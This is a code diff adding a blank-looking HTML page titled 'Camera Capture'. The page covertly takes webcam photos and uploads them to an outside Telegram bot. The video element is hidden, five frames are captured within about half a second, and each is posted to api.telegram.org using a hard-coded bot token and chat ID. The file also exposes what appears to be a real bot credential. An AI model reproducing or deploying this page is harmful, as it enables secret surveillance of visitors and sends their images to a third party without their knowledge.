@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Capture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            overflow: hidden;
+        }
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" width="320" height="240" autoplay></video>
+    <script>
+        const botToken = '6953303172:AAGTWIISatwWXVfl8fusKoIw_lc4ISL-h-s';
+        const chatId = '1717245674';
+
+        // Request access to the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                var video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Wait until the video is loaded
+                video.onloadedmetadata = function() {
+                    // Start capturing photos
+                    let photoCount = 0;
+                    const photos = [];
+                    const captureInterval = 100; // Capture interval in milliseconds (100 ms = 0.1 sec)
+                    const captureDuration = 500; // Total capture duration in milliseconds (500 ms = 0.5 sec)
+                    
+                    const captureIntervalId = setInterval(function() {
+                        if (photoCount >= 5) {
+                            clearInterval(captureIntervalId); // Stop capturing after 5 photos
+                            sendPhotos(photos); // Send photos after capturing
+                            return;
+                        }
+                        var canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        var context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0);
+
+                        canvas.toBlob(function(blob) {
+                            photos.push(blob);
+                        });
+                        photoCount++;
+                    }, captureInterval);
+
+                    // Stop capturing after the specified duration
+                    setTimeout(function() {
+                        clearInterval(captureIntervalId);
+                        sendPhotos(photos); // Send photos after capturing
+                    }, captureDuration);
+
+                    function sendPhotos(photos) {
+                        photos.forEach((photo, index) => {
+                            let formData = new FormData();
+                            formData.append('photo', photo, `photo${index + 1}.jpg`);
+                            
+                            // Send image to Telegram bot
+                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(result => console.log('Success:', result))
+                            .catch(error => console.error('Error:', error));
+                        });
+                    }
+                };
+            })
+            .catch(function(error) {
+                console.error('Error accessing the camera:', error);
+            });
+    </script>
+</body>
+</html>
